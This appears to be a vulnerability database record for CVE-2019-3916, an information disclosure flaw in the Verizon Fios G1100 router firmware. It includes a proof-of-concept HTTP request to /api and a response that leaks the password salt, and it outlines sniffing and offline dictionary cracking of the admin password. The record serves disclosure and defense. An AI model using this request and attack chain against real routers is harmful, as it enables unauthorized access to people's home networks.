    "cve_id": "CVE-2019-3916",
    "description": "Information disclosure vulnerability in Verizon Fios Quantum Gateway (G1100) firmware version 02.01.00.05 allows an remote, unauthenticated attacker to retrieve the value of the password salt by simply requesting an API URL in a web browser (e.g. /api).",
    "details": "An unauthenticated attacker is able to retrieve the value of the password salt by simply visiting a URL in a web browser. Given that the firmware does not enforce the use of HTTPS, it is feasible for an attacker to capture (sniff) a login request. The login request contains a salted password hash (SHA-512), so the attacker could then perform an offline dictionary attack to recover the original password.\n\nA proof of concept is below showing an HTTP request/response pair. Notice that the 'passwordSalt' is returned.\n\n```\nGET /api HTTP/1.1\nHost: 192.168.1.1\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: test; bhr4UI2HasToRefresh=false; bhr4HasEnteredAdvanced=true; Session=; XSRF-TOKEN=\n```\n```\nHTTP/1.1 401 Unauthorized\nCache-Control: no-cache\nContent-Type: application/json; charset=utf-8\nContent-Length: 173\nDate: Thu, 06 Dec 2018 13:00:40 GMT\nServer: lighttpd/1.4.38\n\n{\"doSetupWizard\":false,\"requirePassword\":true,\"passwordSalt\":\"6299bfce-1d56-4a6c-9bd8-352dc9ce865c\",\"isWireless\":false,\"error\":1,\"maxUsers\":10,\"denyState\":0,\"denyTimeout\":0}\n```",
